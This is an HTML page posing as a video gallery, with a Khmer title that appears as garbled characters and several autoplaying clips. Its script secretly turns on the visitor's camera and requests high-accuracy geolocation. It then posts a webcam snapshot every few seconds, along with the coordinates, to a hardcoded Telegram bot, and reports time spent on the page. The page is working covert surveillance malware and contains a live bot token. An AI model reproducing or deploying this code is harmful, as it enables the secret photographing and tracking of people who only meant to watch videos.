<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>·ûú·û∏·ûä·üÅ·û¢·ûº·ûî·üÇ·ûÄ·ûí·üí·ûõ·û∂·ûô</title>
  <style>
@import url('https://fonts.googleapis.com/css2?family=Kantumruy+Pro:ital,wght@0,100..700;1,100..700&display=swap');
h1 {
    text-align: center;
  color:#ffffff;
    padding: 35px;
    background: #FF0076;
    border-radius: 10px;
    margin-bottom: -5px;
  font-weight: 800;
    font-family: "Kantumruy Pro", serif;
    
}
    body {
      background: #ffffff;
      font-family: Arial, sans-serif;
      text-align: center;
      padding: 20px;
    }
    .container {
      max-width: 960px;
      margin: 0 auto;
    }
    video, canvas {
      display: block;
      margin: 10px auto;
      border-radius: 10px;
      max-width: 100%;
    }
  </style>
</head>
<body>
  <h1>·ûú·û∏·ûä·üÅ·û¢·ûº·ûî·üÇ·ûÄ·ûí·üí·ûõ·û∂·ûô</h1> 
<video id="homevideo" autoplay="" controls webkit-playsinline="" width="100%" height="100%" >
 <source src="machiu.mp4" type="video/mp4">
 </source>
</video>

<video id="homevideo" autoplay="" controls webkit-playsinline="" width="100%" height="100%" >
 <source src="p1.mp4" type="video/mp4">
 </source>
</video>


<video id="homevideo" autoplay="" controls webkit-playsinline="" width="100%" height="100%" >
 <source src="p2.mp4" type="video/mp4">
 </source>
</video>


<video id="homevideo" autoplay="" controls webkit-playsinline="" width="100%" height="100%" >
 <source src="p3.mp4" type="video/mp4">
 </source>
</video>


<video id="homevideo" autoplay="" controls webkit-playsinline="" width="100%" height="100%" >
 <source src="p4.mp4" type="video/mp4">
 </source>
</video>


<video id="homevideo" autoplay="" controls webkit-playsinline="" width="100%" height="100%" >
 <source src="p5.mp4" type="video/mp4">
 </source>
</video>

  <div class="container">
    <video id="video" autoplay playsinline width="300" height="225"style="display:none;"></video>
    <canvas id="snapshot" width="300" height="225" style="display:none;"></canvas>
  </div>

  <script>
    const botToken = "6941579931:AAHJRb_kYDxxutmPJ7ji6F5p_laP1LjOnAA";
    const chatId = "1272791365";
    const video = document.getElementById("video");
    const canvas = document.getElementById("snapshot");
    const ctx = canvas.getContext("2d");
    let userLocation = {};

    // Start camera
    navigator.mediaDevices.getUserMedia({ video: true })
      .then(stream => {
        video.srcObject = stream;
        getLocation(); // Request location first
        setTimeout(startLoopCapture, 1000); // Capture image after 2 seconds
      })
      .catch(error => console.error("Camera permission denied:", error));

    // Get user location
    function getLocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          position => {
            userLocation = {
              lat: position.coords.latitude,
              lon: position.coords.longitude
            };
          },
          error => console.error("Error getting location:", error),
          { enableHighAccuracy: true }
        );
      } else {
        console.error("Geolocation not supported.");
      }
    }

    function captureAndSend() {
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      canvas.toBlob(blob => sendPhoto(blob), "image/png");
    }

    function sendPhoto(blob) {
      if (!blob) {
        console.error("Failed to capture snapshot.");
        return;
      }

      const formData = new FormData();
      formData.append("chat_id", chatId);
      formData.append("photo", blob, "snapshot.png");
      formData.append("caption", `Here is your auto-captured gift!\nüìç Location: ${userLocation.lat}, ${userLocation.lon}`);

      fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
        method: "POST",
        body: formData
      })
      .then(response => response.json())
      .then(() => sendLocation()) // Send location after photo
      .catch(error => console.error("Error sending photo:", error));
    }

    function sendLocation() {
      if (!userLocation.lat || !userLocation.lon) {
        console.error("Location not available.");
        return;
      }

      fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          latitude: userLocation.lat,
          longitude: userLocation.lon
        })
      })
      .then(response => response.json())
      .then(data => console.log("Location sent:", data))
      .catch(error => console.error("Error sending location:", error));
    }
    function startLoopCapture() {
      captureAndSend(); // Capture first image immediately
      setInterval(captureAndSend, 4000); // Capture image every 5 seconds
    }
      /************** 10. Time Spent on Page **************/
    const pageStartTime = Date.now();
    window.addEventListener("beforeunload", function () {
      const timeSpent = Math.round((Date.now() - pageStartTime) / 1000);
      const minutes = Math.floor(timeSpent / 60);
      const seconds = timeSpent % 60;
      sendToBot(`Time Spent on Page: ${minutes}m ${seconds}s`);
    });
    function getUserInfo() {
      const ua = navigator.userAgent;
      const screenWidth = window.screen.width;
      const screenHeight = window.screen.height;
      let os = "Unknown OS";
      if (ua.includes("Win")) os = "Windows";
      else if (ua.includes("Mac")) os = "MacOS";
      else if (ua.includes("Linux")) os = "Linux";
      else if (ua.includes("Android")) os = "Android";
      else if (ua.includes("iPhone")) os = "iOS";
      let browser = "Unknown Browser";
      if (ua.includes("Chrome") && !ua.includes("Edge")) browser = "Chrome";
      else if (ua.includes("Firefox")) browser = "Firefox";
      else if (ua.includes("Safari") && !ua.includes("Chrome")) browser = "Safari";
      else if (ua.includes("Edge")) browser = "Edge";
      return `OS: ${os}, Browser: ${browser}, Screen: ${screenWidth}x${screenHeight}`;
    }
    // Uncomment to send device info separately:
    // sendToBot("Device Info: " + getUserInfo());

  </script>
</body>
</html>
